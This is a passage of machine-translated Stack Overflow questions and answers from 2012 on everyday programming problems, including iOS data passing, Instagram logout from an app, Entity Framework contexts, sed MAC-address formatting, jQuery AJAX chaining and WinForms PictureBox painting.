我有一个应用程序，其中有一个将数据作为字典返回的 Web 服务调用。我想在另一个视图控制器中访问此字典，以将值加载到表中。

任何人都可以演示如何将此响应字典从一个视图控制器传递到另一个视图控制器吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-12T06:57:03.973

您可以在您的中定义一个`NSDictionary`属性`AnotherViewController`并从前一个控制器中设置它。我将在下面给出一个简单的例子。

```
//.h
@interface AnotherViewController {

  NSDictionary *data;
}
@property(nonatomic,retain) NSDictionary *data;
@end

//.m
@implementation AnotherViewController
@synthesize data; 
```

现在从当前控制器开始，在初始化之后`AnotherViewController`设置字典，然后再呈现它。

```
AnotherViewController *controller = [[AnotherViewController alloc] init];
controller.data = myCurrentDictionary; 
```

现在`AnotherViewController`有一个`data`具有前一个控制器值的属性。

希望这可以帮助。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-12T06:57:38.597

我假设 Web 服务被调用是因为发生了一些事情（单击按钮，`viewDidLoad`/ `viewDidAppear`）。如果是这种情况，将 的引用传递`UIViewController`给 webservice 类是一个完美的有效选择。请记住，对于这种关系，您应该创建一个协议，因此在您的 web 服务类中，您有如下内容：

```
id<ViewControllerResponseProtocol> referenceToViewController; 
```

这`ViewControllerResponseProtocol`将定义一个这样的方法：

```
-(void)responseFromWebservice:(NSDictionary*)myDictionary; 
```

因此，当 webservice 类构建时，`NSDictionary`您可以从以下方法中使用上述方法`referenceToViewController`：

```
[referenceToViewController responseFromWebservice:myDictionary]; 
```

如果两者之间没有任何关系，则可以使用 can `NSNotificationCenter`。

**PS**：skram 的解决方案是完全有效的，如果你已经`NSDictionary`从 web 服务中获得了初始值`UIViewController`，现在你想将它传递给一个新的`UIViewController`. 虽然我不认为那是你想要的。

# image - 如何压缩连续图像，例如来自 5 秒视频？

> ID：10991747
> 
> 赞同：1
> 
> 时间：2012-06-12T06:51:55.967
> 
> 标签：image, video, compression

我有来自 5 秒视频 (10 fps) 的 50 张图像。如何使用空间和时间运动补偿将这些图像压缩到单个二进制文件中？后来我想从这个压缩文件中重新创建所有 50 个图像。（有损没问题）

# api - Instagram Api 用户注销

> ID：10991753
> 
> 赞同：10
> 
> 时间：2012-06-12T06:52:28.263
> 
> 标签：api, logout, instagram

如何仅从**我的应用程序**中执行注销（不是从 instagram 帐户，而是从我的应用程序）？

我看到有人说“将用户推荐到 instagram 注销页面”，但这不是我真正需要的。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-19T07:59:51.210

您可以在自己的“注销”页面中使用 iframe。就像是：

```
<iframe src="https://instagram.com/accounts/logout/" width="0" height="0" /> 
```

您可能希望在执行注销后重定向到主页。

希望有帮助。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2015-02-10T01:17:16.690

如果 Bhavik S 的答案对你不起作用，就像我一样，因为 XFrame Options 设置为 SAMEORIGIN，请尝试将注销放在图像的 src 中：

```
<img src="http://instagram.com/accounts/logout/" width="0" height="0" /> 
```

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2012-09-18T04:10:22.903

如果您使用的是 PHP/HTML，我会放置一个隐藏的 IMG 元素，其中 SRC 属性指向 Instagram 注销 URL。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2013-11-12T12:06:34.790

您可以使用 ajax 调用，这为您提供了另一个好处，即在由于任何原因导致 HTTP 错误的情况下，您将获得异常，您可以发现它已被注销或您收到任何 http 错误。此外，如果成功，您可以运行一些代码来显示或隐藏页面上的任何组件，而无需任何页面刷新。

```
 $.ajax({
            url: "https://instagram.com/accounts/logout/",
            success: function (data) {
            },
            error: function (e) {
                alert('Error::' + e.responseText);
                //in case of any error you can put some code here.
            }
        }); 
```

# c# - 实体框架和 DBContext 问题

> ID：10991762
> 
> 赞同：2
> 
> 时间：2012-06-12T06:53:35.067
> 
> 标签：c#, .net-4.0, entity-framework-4, database-concurrency

我被警告不要在我的应用程序中使用多个实体框架的 DBEntityContext。原因是由于对数据库的并发访问而导致死锁的风险。

有人可以证实这一点吗？如果这是真的，那么为 DBContext 实现一个 Singleton 对象是个好主意吗？

欢迎任何关于这个问题的文章。

谢谢提前。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-06-14T13:48:20.677

ObjectContext 和 DbContext 不是线程安全的。请参阅[http://msdn.microsoft.com/library/system.data.objects.objectcontext.aspx](http://msdn.microsoft.com/library/system.data.objects.objectcontext.aspx)。如果您在像 ASP.NET 这样的多线程环境中使用它们，那么在使用单个实例时会遇到很大的麻烦。建议每个请求使用一个 ObjectContext。ObjectContext 必须在请求结束时处理。[在 n 层 ASP.NET 应用程序中管理实体框架 ObjectContext 生命周期和范围](http://dotnetslackers.com/articles/ado_net/Managing-Entity-Framework-ObjectContext-lifespan-and-scope-in-n-layered-ASP-NET-applications.aspx)的文章可能会有所帮助。

有没有可能，你误解了告诉你死锁的顾问？可能是他想警告您以错误方式使用 ObjectContext 时可能出现的死锁。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-12T08:05:35.063

在 Web 应用程序中，您必须为每个已处理的 Web 请求使用一个新的上下文实例，并在不再需要该实例后处理该实例。上下文和任何与 EF 相关的东西都不是线程安全的。此外，它实现了工作单元和身份映射模式，这对使用上下文实例进行了[其他限制。](https://stackoverflow.com/questions/3653009/entity-framework-and-connection-pooling/3653392#3653392)

死锁可能会发生，但这是您必须通过正确的事务设计来解决的问题。

# regex - sed 在 mac 地址中插入冒号

> ID：10991771
> 
> 赞同：5
> 
> 时间：2012-06-12T06:54:42.570
> 
> 标签：regex, sed

我有一个这种格式的mac地址列表：

```
412010000018
412010000026
412010000034 
```

我想要这个输出：

```
41:20:10:00:00:18
41:20:10:00:00:26
41:20:10:00:00:34 
```

我试过这个，但没有奏效：

```
sed 's/([0-9]{2})([0-9]{2})([0-9]{2})([0-9]{2})/\1:\2:\3:\4/g' mac_list 
```

我该怎么做？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-06-12T12:13:24.327

这可能对您有用（GNU sed）：

```
sed 's/..\B/&:/g' file 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2014-08-08T17:34:24.627

这对我有用

```
sed 's/\(..\)/\1:/g;s/:$//' file 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-06-12T07:08:10.780

您必须使用正确的`sed`语法：

```
\{I\}
     matches exactly I sequences (I is a decimal integer;
     for portability, keep it between 0 and 255 inclusive).

\(REGEXP\)
     Groups the inner REGEXP as a whole, this is used for back references. 
```

这是一个涵盖前 2 个字段的示例命令

```
 sed 's/^\([0-9A-Fa-f]\{2\}\)\([0-9A-Fa-f]\{2\}\).*$/\1:\2:/' 
```

下面的命令可以处理一个完整的MAC地址，并且易于阅读：

```
 sed -e 's/^\([0-9A-Fa-f]\{2\}\)/\1_/'  \
     -e 's/_\([0-9A-Fa-f]\{2\}\)/:\1_/' \
     -e 's/_\([0-9A-Fa-f]\{2\}\)/:\1_/' \
     -e 's/_\([0-9A-Fa-f]\{2\}\)/:\1_/' \
     -e 's/_\([0-9A-Fa-f]\{2\}\)/:\1_/' \
     -e 's/_\([0-9A-Fa-f]\{2\}\)/:\1/' 
```

遵循@Qtax 在此处发布的带有全局替换的 perl 解决方案的想法，可以获得更短的解决方案：

```
 sed -e 's/\([0-9A-Fa-f]\{2\}\)/\1:/g' -e 's/\(.*\):$/\1/' 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-06-12T07:12:14.567

Perl 示例：

```
perl -pe 's/(\b|\G)[\da-f]{2}(?=[\da-f]{2})/$&:/ig' file 
```

如果文件只有 MAC 地址，可以简化为：

```
perl -pe 's/\w{2}\B/$&:/g' file 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-06-12T07:10:55.300

如果`awk`是可接受的解决方案：

```
awk 'BEGIN { FS= "" }
{ for (i=1; i<=length($0) ; i++) {
      if (i % 2 == 0) { macaddr=macaddr $i ":" } 
      else { macaddr = macaddr $i }
  }
  print gensub(":$","","g",macaddr)
  macaddr=""
}' INPUTFILE 
```

做得很好。[在这里您可以看到它的实际效果](http://ideone.com/Gd4Tp)。

# spring - 当表单从 onSubmit 返回时，未选中 Spring MVC HTML 复选框

> ID：10991772
> 
> 赞同：0
> 
> 时间：2012-06-12T06:54:51.597
> 
> 标签：spring, jsp, spring-mvc

我正在使用 SimpleFormController 并在视图中有复选框。提交表单时，复选框的值正确绑定到 bean。但是当表单（jsp 视图）从 onSubmit 方法返回时，不会选中复选框。我试过做以下事情： -

1.  `<input name="location" description="xyz" type="checkbox" id="location-filter-1" style="float:left" value="1"/>`

2.  `<input name="location" description="xyz" type="checkbox" id="location-filter-1" style="float:left" value="1"/> <input type="hidden" name="_location" value="visible"/>`

3.  `<springbind:bind path="location"> <input name="location" description="chennai" type="checkbox" id="location-filter-1" style="float:left" value="1"/> <input type="hidden" name="_location" value="visible"/> </springbind:bind>`

我没有运气检查这些复选框。任何人都可以建议解决这个问题。在 bean 中，整数数组用于保存选中复选框的值：- `private Integer[] location;`

复选框目前是这样的：- 复选框的排列方式如下

```
<ul>
    <li class="x">
     <span>text</span>
     <input type="checkbox" value="1" id="location-1" name="location"/>
    </li>
    <li><span>text</span>
     <input type="checkbox" value="2" id="location-2" name="location"/>
     </li>
     <li>...</li>
      ..
</ul> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T07:08:53.910

您应该尝试使用 spring 框架的表单标签库来绑定复选框的值。

```
<form:checkboxes items="" path=""/> 
```

在 items 属性中传递包含复选框值的**列表，并在路径中使用****location**。

希望这对您有所帮助。干杯。

# javascript - 多个链接的 jQuery AJAX POST Web 服务调用

> ID：10991773
> 
> 赞同：1
> 
> 时间：2012-06-12T06:54:53.607
> 
> 标签：javascript, jquery, ajax, web-services, post

我使用 jQuery AJAX 调用 web 服务。这些调用必须被链接起来。基于[https://stackoverflow.com/a/995648/296575](https://stackoverflow.com/a/995648/296575)的解决方案，我创建了一个 AJAX 队列。

```
function ajaxQueue(step) {
          switch(step) {
            case 0: $.ajax({
                      type: "POST",
                      url: "url",
                      data: SoapRequest1,
                      contentType: "text/xml",
                      complete: storeData1                          
                     }); break;
            case 1: $.ajax({
                      type: "POST",
                      url: "url",
                      data: SoapRequest2,
                      contentType: "text/xml",
                      complete: storeData2
                    }); break;
            case 2: $.ajax({
                      type: "POST",
                      url: "url",
                      data: SoapRequest3,
                      contentType: "text/xml",
                      complete: storeData3
                    }); break;
          }
        }       
        //start ajaxQueue
        ajaxQueue(0);

        function storeData1(xmlHttpRequest, status) 
        {                                           
                updateData1(xmlHttpRequest.responseXML);
                ajaxQueue(1);           
        }

        function storeData2(xmlHttpRequest, status) 
        {
              updateData2(xmlHttpRequest.responseXML);
                ajaxQueue(2);
      }

        function storeData3(xmlHttpRequest, status) 
        {
                updateData3(xmlHttpRequest.responseXML);

      } 
```

现在我有以下问题：如果函数被执行，只有第一种情况会从 web 服务返回正确的 XML。第二次和第三次调用导致错误。（解析错误，数据为空）。

调用是跨域的，受以下因素抑制：

```
 netscape.security.PrivilegeManager.enablePrivilege("UniversalBrowserRead"); 
```

如果我在每个调用中添加 async:false ，它们都会正确执行。如果我更改调用的顺序，总是第一个正确执行。

谁能帮我解决这个问题？或者告诉我如果您需要更多信息。

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T17:52:49.327

嗯，如果我正在链接 ajax 调用，我只会将第二个调用放在第一个调用成功处理程序或它的一些变体中。

```
$.ajax( {
   url: 'blah.com',
   success: function( result ) {
      $.ajax( {
         url: 'blah.com',
         success: function( result ) {
            // now in second leg of the chain.
            // you can keep going like this forever.

         }
      } );
   }
} ); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T18:55:44.760

使用回调（当 AJAX 请求完成时调用的东西），将它作为参数传递到您的队列中：

```
function ajaxQueue(step, callback) {
      switch(step) {
        case 0: $.ajax({
                  type: "POST",
                  url: "url",
                  data: SoapRequest1,
                  contentType: "text/xml",
                  complete: callback                          
                 }); break;
        case 1: $.ajax({
                  type: "POST",
                  url: "url",
                  data: SoapRequest2,
                  contentType: "text/xml",
                  complete: callback
                }); break;
        case 2: $.ajax({
                  type: "POST",
                  url: "url",
                  data: SoapRequest3,
                  contentType: "text/xml",
                  complete: callback
                }); break;
      }
    }       

    //start ajaxQueue
    ajaxQueue(0, function() {
        // do something when ajaxQueue(0) has returned from AJAX call
    });

    function storeData1(xmlHttpRequest, status) 
    {          
         // passes updateData1 as a callback, automatically passes params from AJAX call                                                 
         ajaxQueue(1, updateData1);           
    } 
```

# regex - 循环 ASP 中的两个正则表达式

> ID：10991774
> 
> 赞同：0
> 
> 时间：2012-06-12T06:54:55.167
> 
> 标签：regex, asp-classic, pattern-matching

```
Function VeriBul(BaslangicDegeri,BitisDegeri)

  Set RegEx = New RegExp
  RegEx.IgnoreCase = True
  RegEx.Global = True
  RegEx.Pattern = "(" & BaslangicDegeri & ")(.+?)(" & BitisDegeri & ")"
  Set Sonuc = RegEx.Execute(Mid(strRetval,29600,254000))

  For Each i in Sonuc
 VeriBul =  VeriBul & tr2(i.SubMatches(1))

    Set RegEx2 = New RegExp
    RegEx2.IgnoreCase = True
    RegEx2.Global = True
    RegEx2.Pattern = "(<hemenalfiyat>)(.+?)(</hemenalfiyat>)"
    Set Sonucx = RegEx2.Execute(Mid(strRetval,33000,2000))

     For Each y in Sonucx
     VeriBul2 =  VeriBul2 & tr2(y.SubMatches(1))
     Next

     When it works then appering error

  Next 
```

==================================================== ====

```
For Each i in Sonuc
  i.SubMatches(1)

For Each y in Sonucx
  y.SubMatches(1)

  Next
  Next 
```

除了 Submatches 代码，我如何打印这个？因为我有两个这样的正则表达式代码（所以我用作 Regex2），我不能再次使用子匹配。

谢谢，

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T21:17:07.920

如果没有其余代码（tr2）以及您的输入和所需的输出，很难解决这个问题，但我认为您的代码应该是这样的

```
Function VeriBul(BaslangicDegeri,BitisDegeri)

  Set RegEx = New RegExp
  RegEx.IgnoreCase = True
  RegEx.Global = True
  RegEx.Pattern = "(" & BaslangicDegeri & ")(.+?)(" & BitisDegeri & ")"

  Set RegEx2 = New RegExp
  RegEx2.IgnoreCase = True
  RegEx2.Global = True
  RegEx2.Pattern = "(<hemenalfiyat>)(.+?)(</hemenalfiyat>)"

  Set Sonuc = RegEx.Execute(Mid(strRetval,29600,254000))
  Set Sonucx = RegEx2.Execute(Mid(strRetval,33000,2000))

  For Each i in Sonuc
    VeriBul =  VeriBul & tr2(i.SubMatches(1))
  Next
  For Each y in Sonucx
   VeriBul =  VeriBul & tr2(y.SubMatches(1))
  Next

Next 
```

# ios - 使用 iphone sdk 在应用内购买货币交易

> ID：10991777
> 
> 赞同：3
> 
> 时间：2012-06-12T06:55:24.250
> 
> 标签：ios, in-app-purchase, ios5

我对应用程序购买非常陌生，在我的应用程序中，我需要实现一种方式让用户向客户支付一些钱。你们能否给我一些关于不同可能性的想法。

客户和用户是否必须需要一个苹果 ID 才能进行交易？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-22T19:09:17.890

是的，您的客户（如委托此应用程序的人）和用户都需要一个苹果 ID。用户需要它来使用应用商店和应用内购买。客户需要它成为应用商店的发布者并接收付款。

但是，您不能随意选择是否要在应用购买中使用。有几条规则禁止您将其用于某些目的，并要求您将其用于其他目的。

根据经验，如果付款是针对功能或数据（例如游戏中的更多关卡）或服务（例如云数据存储），并且您可以立即交付，则**必须**在应用程序购买中使用。在某些情况下（例如书籍），您可以在应用程序外接受付款，但不允许您从应用程序内链接到该付款信息。

如果付款是为了应用程序之外的服务或神灵（如披萨、捐赠或巴士票），则**不允许**您在应用程序购买中使用。

[https://developer.apple.com/appstore/in-app-purchase/index.html](https://developer.apple.com/appstore/in-app-purchase/index.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-24T16:38:28.323

您可以为此使用 iphone Paypal API。

实现细节可以在这个链接中找到： [How to impliment payment-gateway with iphone application?](https://stackoverflow.com/questions/6689019/how-to-impliment-payment-gateway-with-iphone-application)

# javascript - onChange 或其他选项？

> ID：10991779
> 
> 赞同：2
> 
> 时间：2012-06-12T06:55:36.320
> 
> 标签：javascript, jquery, javascript-events

我正试图**摆脱我网站上的保存按钮**。

我知道最明显的方法是做一个**Jquery onChange 事件**。但似乎**服务器上会有很多查询**。

我也想过这样做`onBlur`，但这意味着用户需要在加载新页面之前单击其他地方，如果他忘记了，更改将会丢失。

还有其他更有效的方法吗？

例如，Asana 使用什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-12T07:00:09.783

您应该使用去抖动，以便您只在短暂的不活动期后进行 AJAX 调用。这是 Underscore.js 的实现：[http ://underscorejs.org/#debounce](http://underscorejs.org/#debounce)

# php - Klarna 与网上商店的集成

> ID：10991781
> 
> 赞同：1
> 
> 时间：2012-06-12T06:55:53.247
> 
> 标签：php, mysql, payment-processing, klarna

任何人都可以帮助我进行 Klarna 集成，以及如何将 pclass 参数传递给`addTransaction`方法，例如，如果我想向 Klarna 传递**客户将分 12 期付款**的指令，我该如何实现这一点，谢谢。

注意：我已经获取了 pclass 并将它们保存在一个文件中。

任何人都可以在这里为我的帮助放置 add_transaction() 函数的简短代码示例吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-13T13:34:00.670

部分付款的 pClass 可以在文件 addTransaction 中设置，方法是将 INVOICE 更改为您收到的部分付款或特定活动的 pClass ID。如果您查看 addTransaction 示例文件中的第 200 行，它看起来像这样：

```
try {
//Transmit all the specified data, from the steps above, to Klarna.
$result = $k->addTransaction(
   $pno = '07071960', //Date of birth for DE.
   $gender = KlarnaFlags::MALE, //The customer is a male.
   $flags = KlarnaFlags::NO_FLAG, //No specific behaviour like RETURN_OCR or TEST_MODE.
   $pclass = KlarnaPClass::INVOICE 
```

在最后一行 206 中，您可以将 INVOICE 删除到您首选的 pClass ID：例如 $pclass = KlarnaPClass::676。

另一种方法是给我们打电话（Klarna）。

# ruby-on-rails - 如何在 mongoID 中保存工作

> ID：10991787
> 
> 赞同：0
> 
> 时间：2012-06-12T06:56:21.030
> 
> 标签：ruby-on-rails, performance, mongoid

有一个对象和嵌入的子对象

```
class Object
  include Mongoid::Document

  embeds_many :sub_objects
end

class SubObject
  include Mongoid::Document

  field :str1,:type => String
  field :ind1,:type => Integer

  embedded_in :object
end 
```

控制台输出

```
irb(main):060:0> obj = Object.first
=> #<Object _id: 4fd5ed971d41c8252c001f49, ..............>
irb(main):061:0> obj.sub_objects.size
=> 24000
irb(main):062:0> obj.save
=> true 
```

这里发生了有趣的事情。Mongoid 实际上并没有保存对象，因为对象没有改变。即没有调用mongodb。但是保存操作本身需要 18 (!!!) 秒。

谁能向我解释发生了什么以及如何避免它？

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T10:55:07.497

这应该这样做：

```
obj.save if !obj.persisted? || obj.changed?  # only save if new record, or something changed 
```

# javascript - 如何在dynatree中选择节点

> ID：10991791
> 
> 赞同：4
> 
> 时间：2012-06-12T06:56:28.963
> 
> 标签：javascript, jquery, model-view-controller, dynatree

```
tree.dynatree({
        initAjax: {
            url: "../Users/GetTree"
        },
        checkbox: true,
        selectMode: 2,
        fx: { height: "toggle", duration: 200 },
        persist: true,
        clickFolderMode: 1,
        autoFocus: false,

         onClick: function (node, event) {
           ....
         }
   } 
```

在服务器端我有类 TreeNode

```
 public class TreeNode
 { 
      .....

      public TreeItemsAttr attr { get; set; }

      public string addClass { get; set; }
 } 
```

和类 TreeItemsAttr

```
 public class TreeItemsAttr
{
    public string id { get; set; }

    public bool canHaveSubs { get; set; }

    public bool selectable { get; set; }

    public bool isSelected { get; set; }

    public string docDate { get; set; }
} 
```

因此，在我的操作中，我设置了一些树节点`isSelected=true`并添加了 class `addClass="dynatree-selected"`，但是当我调用时，`node.tree.getSelectedNodes()`我得到了`[]`.

如何在服务器端设置以便选择一些节点？

我也尝试在 TreeNode 属性中添加选择并设置为 true，但这对我没有帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-09T13:52:46.960

遵循 Alper 的示例后，您可以将 selectedKeys 保存到隐藏字段，从而在服务器端使这些值对您可用：

```
var arraySelKeys = selectedKeys.toString().split(",");
$("[id$=_hdnSelKeys]").val(arraySelKeys.toString()); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-31T19:00:19.467

在[dynatree 文档页面](http://wwwendt.de/tech/dynatree/doc/dynatree-doc.html)（在第 5.3 节处理选择事件中）有一个用于该目标的示例。

```
onSelect: function(flag, node) {
        if( ! flag )
            alert("You deselected node with title " + node.data.title);
        var selectedNodes = node.tree.getSelectedNodes();
        var selectedKeys = $.map(selectedNodes, function(node){
            return node.data.key;
        });
        alert("Selected keys: " + selectedKeys.join(", "));
    } 
```

结果页面是：[http ://wwwendt.de/tech/dynatree/doc/sample-select.html](http://wwwendt.de/tech/dynatree/doc/sample-select.html)

这种方式在客户端工作，但我认为您可以将选定的变量发送到您的服务器。

# c - 为什么函数的参数是寄存器类型

> ID：10991793
> 
> 赞同：3
> 
> 时间：2012-06-12T06:56:42.317
> 
> 标签：c, function, compiler-construction, arguments

对不起，如果我的口音受伤

在 C 编程中，您可以像这样声明一个函数：dennis ritche 2nd ed page 84

```
 f(register unsigned m,register long n) 
```

大多数书籍都说函数参数的默认存储类型最好是`register`.

为什么这样？有什么需要？

答案后面的编译器将它们与 cpu 寄存器一起保存，但是

使用寄存器类型时，我没有看到执行速度有任何差异

任何人都可以详细解释为什么以及在何处以及何时在 C 编程中使用寄存器？

谢谢

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-12T14:54:37.147

我很想看看哪些书是这么说的。

老实说，在编译器技术的这一点上，几乎没有任何用处来声明带有`register`修饰符的东西。事实上，许多编译器会简单地把它扔掉，然后做他们想做的任何事情。关键是这在架构、编译器之间变化很大，并且还受到编译器进行的其他优化类型的影响。因此，是否将某些内容存储在寄存器中的选择最好留给编译器来选择，并且`register`修饰符的使用通常被认为是过时的反模式。

编辑：我错误地记得`register`是一个限定符（无论如何它不符合类型限定符的使用，所以我应该知道），修复......

# c# - C#多图片框初始化问题

> ID：10991798
> 
> 赞同：1
> 
> 时间：2012-06-12T06:57:02.553
> 
> 标签：c#, winforms, picturebox

我正在组合一个在 GUI 上使用多个图片框的应用程序。我已经为每个在绘画事件上调用的图片框编写了自定义事件。

不幸的是，当应用程序运行时，恰好一个图片框正确显示。其他的只是显示为白框。无论哪个 opicturebox 恰好首先添加到 form.designer 中，都是正确显示的图片框，对于其他图片框，它们的绘制事件永远不会触发。我试图通过在表单构造函数中调用picturebox.refresh()、picturebox.update() 和picturebox.invalidate() 的各种组合来解决这个问题，但无济于事。

有趣的是，当我将按钮按下事件与 picturebox.refresh() 和 picturebox.update() 相关联并在程序运行后按下按钮时，图片框开始正常运行 - 调用绘制事件并更新图像。

有谁知道如何让所有图片框在初始化时正确显示？

可能有用的代码片段：

图片框的绘制代码：

```
private void PictureBox1_Paint(object sender, PaintEventArgs e)
{
    paintPictureBox(e, PictureBox1, currentImage[0]);
}

private void paintPictureBox(PaintEventArgs e, PictureBox picBox,ImageObject c)
{
    try
    {
        Font myFont = new Font("Arial", 14);
        //Get bitmap
        Bitmap imageToDisplay = new Bitmap(Bitmap.FromFile(c.ImageFile));
        //resize smallest dimension to 200
        if (imageToDisplay.Height > imageToDisplay.Width)
        {
            imageToDisplay = new Bitmap(Bitmap.FromFile(c.ImageFile), 200, 200 * imageToDisplay.Height / imageToDisplay.Width);
        }
        else
        {
            imageToDisplay = new Bitmap(Bitmap.FromFile(c.ImageFile), 200 * imageToDisplay.Width / imageToDisplay.Height, 200);
        }
        //crop anything outside of 200x200
        imageToDisplay = imageToDisplay.Clone(new Rectangle(Math.Max((imageToDisplay.Width - 200) / 2, 0), Math.Max((imageToDisplay.Height - 200) / 2, 0), 200, 200), imageToDisplay.PixelFormat);
        //now draw it
        picBox.Image = imageToDisplay;  
        //add the name
        e.Graphics.DrawString(c.Name, myFont, Brushes.Maroon, new Point(2, 200));
    }
    catch (Exception E)
    {
        MessageBox.Show("Could not display image successfully\n" + E.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
    }
} 
```

来自 form.designer 的代码：

```
 //This one displays correctly on initialisation
    this.Controls.Add(this.PictureBox0);
    //These two do not
    this.Controls.Add(this.PictureBox1);
    this.Controls.Add(this.PictureBox2);
    ((System.ComponentModel.ISupportInitialize)(this.PictureBox0)).EndInit();
    ((System.ComponentModel.ISupportInitialize)(this.PictureBox1)).EndInit();
    ((System.ComponentModel.ISupportInitialize)(this.PictureBox2)).EndInit(); 
```

使图片框正确显示的按钮按下代码（初始化后）：

```
private void Button_Click(object sender, EventArgs e)
{
    //Refresh the picture boxes
    foreach (PictureBox pb in this.Controls.OfType<PictureBox>())
    {
        pb.Refresh();
        pb.Update();
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T08:08:50.917

`Paint`每次需要重新绘制窗口时都会引发该事件。例如，如果另一个窗口被拖到您的顶部，该`Paint`事件将每秒引发几次。因此，重要的是您的`paintPictureBox`函数除了绘制之外什么都不做。

问题是`paintPictureBox`不断地重新初始化位图，但实际上并没有绘制它。此外，您每次绘制时都从磁盘读取并创建多个位图。这很慢并且使用大量内存。

相反，您应该`Image`在表单加载时初始化每个图片框的属性一次。然后每个图片框将负责绘制自己的位图。您的绘画事件应该只绘制图片名称。

# python - 如何使用 Python 和 Linux 捕获 HID 输入？

> ID：10991801
> 
> 赞同：0
> 
> 时间：2012-06-12T06:57:09.237
> 
> 标签：python, linux, linux-kernel, python-2.7, linux-device-driver

我将 IPD Ultima 游戏杆连接到我的 Linux 机器。当我执行以下操作时：

$ modprobe uinput $ lsmod | grep 输入

```
uinput                 17246  0 
```

$ lsusb - 好的

```
Bus 002 Device 002: ID 0461:4d65 Primax Electronics, Ltd 
```

$ xinput list - 什么都没有

```
⎡ Virtual core pointer                      id=2    [master pointer  (3)]
⎜   ↳ Virtual core XTEST pointer                id=4    [slave  pointer  (2)]
⎜   ↳ SynPS/2 Synaptics TouchPad                id=12   [slave  pointer  (2)]
⎜   ↳ USB Optical Mouse                         id=14   [slave  pointer  (2)]
⎣ Virtual core keyboard                     id=3    [master keyboard (2)]
    ↳ Virtual core XTEST keyboard               id=5    [slave  keyboard (3)]
    ↳ Video Bus                                 id=6    [slave  keyboard (3)]
    ↳ Power Button                              id=7    [slave  keyboard (3)]
    ↳ Sleep Button                              id=8    [slave  keyboard (3)]
    ↳ AT Translated Set 2 keyboard              id=11   [slave  keyboard (3)]
    ↳ Dell WMI hotkeys                          id=13   [slave  keyboard (3)] 
```

$ dmesg - 好的

```
H PRODUCTS CH Products IPD Ultima] on usb-0000:00:1d.1-1/input0
[42731.000208] usb 3-1: USB disconnect, device number 2
[42737.291095] usb 3-1: new low-speed USB device number 3 using uhci_hcd
[42737.457157] usb 3-1: New USB device found, idVendor=068e, idProduct=0060
[42737.457167] usb 3-1: New USB device strings: Mfr=1, Product=2, SerialNumber=0
[42737.457175] usb 3-1: Product: CH Products IPD Ultima
[42737.457182] usb 3-1: Manufacturer: CH PRODUCTS
[42737.489359] input: CH PRODUCTS CH Products IPD Ultima as /devices/pci0000:00/0000:00:1d.1/usb3/3-1/3-1:1.0/input/input13
[42737.489867] generic-usb 0003:068E:0060.0005: input,hidraw0: USB HID v1.00 Joystick [CH PRODUCTS CH Products IPD Ultima] on usb-0000:00:1d.1-1/input0 
```

$ python it: - 不行

```
sf1 = open("test.usbdump").read() # read the earlier usb dump from hiddevice
kb = open("/dev/usb/hiddev0")
while 1:
  print (kb.read(len(sf1)) == sf1) 
```

$ pgame it: - 不行

```
#/usr/bin/env python
#
# yum list installed pygame*
#Loaded plugins: auto-update-debuginfo, langpacks, presto, refresh-packagekit
#Installed Packages
#pygame.i686                               1.9.1-6.fc15                          @updates
#pygame-devel.i686                         1.9.1-6.fc15                          @updates

import os, pygame
from pygame.locals import *
def main():
  pygame.init()
  pygame.joystick.init()
  pygame.display.set_mode((468, 60))
  pygame.display.set_caption('HID Python')
  pygame.mouse.set_visible(0)

  while 1:
    for event in pygame.event.get():
      print event.type
      if event.type == QUIT:
        return
      elif event.type == KEYDOWN and event.key == K_ESCAPE:
        return
      elif event.type == MOUSEBUTTONDOWN:
        print '\/'
      elif event.type is MOUSEBUTTONUP:
        print '/\'
      elif event.type is JOYAXISMOTION:
        print '()'
      elif event.type is JOYBALLMOTION:
        print '()()'
      elif event.type is JOYHATMOTION:
        print '<>'
      elif event.type is JOYBUTTONUP:
        print '//\\'
      elif event.type is JOYBUTTONDOWN:
        print '\\//'

if __name__ == '__main__': 
  main() 
```

没运气。任何帮助的想法为什么我什么都得不到？

**跟进：**

```
# cat /dev/input/js0 
=c��=c��=c��=c��=c��=c��=c��=c��=c�=c�� =c��
=c��
     =c��=c��=c��
&n��n�Vp�&amp;q�r��r�Nt��t�&gt;u��u��v�w�~w��z���{��|�}�n}��}�~�N~��~��~�.������������������������>�����拋6�����V�����������6�����&amp;��������v��昋�v�� 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-18T12:26:57.270

从捕获输入编写解码器。

# android - 如何只编译使用过的资源

> ID：10991803
> 
> 赞同：2
> 
> 时间：2012-06-12T06:57:14.160
> 
> 标签：android, compiler-construction, builder

一段时间以来，我一直在使用一个包含大量可重用代码的库项目。这样，如果有错误，我只需要在一个地方修复它。该项目还包含大量资源。它包含所有这些东西并不是真正的问题，因为在大多数项目中我几乎都使用它们。

